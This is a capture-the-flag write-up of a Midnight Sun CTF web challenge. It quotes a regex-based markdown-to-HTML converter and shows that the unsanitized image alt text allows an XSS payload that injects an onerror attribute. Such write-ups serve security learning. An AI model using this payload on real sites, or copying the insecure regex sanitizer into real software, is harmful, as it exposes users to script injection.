## Marcozuckerbergo

* Category  : Web
* Problem	: Someone told me to use a lib, but real developers rock regex one-liners.
* URL		: `http://marcodowno-01.play.midnightsunctf.se:3001`

----

So it was a xss challenge where we were suppose to xss at `http://marcodowno-01.play.midnightsunctf.se:3001/markdown?input=test` and submit solution with xss payload.
On Viewing the source we have regex to convert mark down to HTML using following code:
```javascript
function markdown(text){
  text = text
  .replace(/[<]/g, '')
  .replace(/----/g,'<hr>')
  .replace(/> ?([^\n]+)/g, '<blockquote>$1</blockquote>')
  .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
  .replace(/__([^_]+)__/g, '<b>$1</b>')
  .replace(/\*([^\s][^*]+)\*/g, '<i>$1</i>')
  .replace(/\* ([^*]+)/g, '<li>$1</li>')
  .replace(/##### ([^#\n]+)/g, '<h5>$1</h5>')
  .replace(/#### ([^#\n]+)/g, '<h4>$1</h4>')
  .replace(/### ([^#\n]+)/g, '<h3>$1</h3>')
  .replace(/## ([^#\n]+)/g, '<h2>$1</h2>')
  .replace(/# ([^#\n]+)/g, '<h1>$1</h1>')
  .replace(/(?<!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, '<a href="$1">$1</a>')
  .replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
  .replace(/(?<!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, '<a href="$2">$1</a>')
  .replace(/`([^`]+)`/g, '<code>$1</code>')
  .replace(/```([^`]+)```/g, '<code>$1</code>')
  .replace(/\n/g, "<br>");
  return text;
}
```

One of the basic xss payload is `<img src='x' onerror=alert('1')>`. so on looking into the regex that evaluate mark-down to  `img`, we have

```
.replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
```


Which converts `![imageAlt](https://site.com)` to `<img src="https://site.com" alt="imageAlt">`.  Here because imageAlt wasn't sanitized we can easily have xss with:
```
![ " onerror=alert(1) x=" ](https://x0m) 
```
which evalues to `<img src="https://x0m" alt="" onerror="alert(1)" x="">`
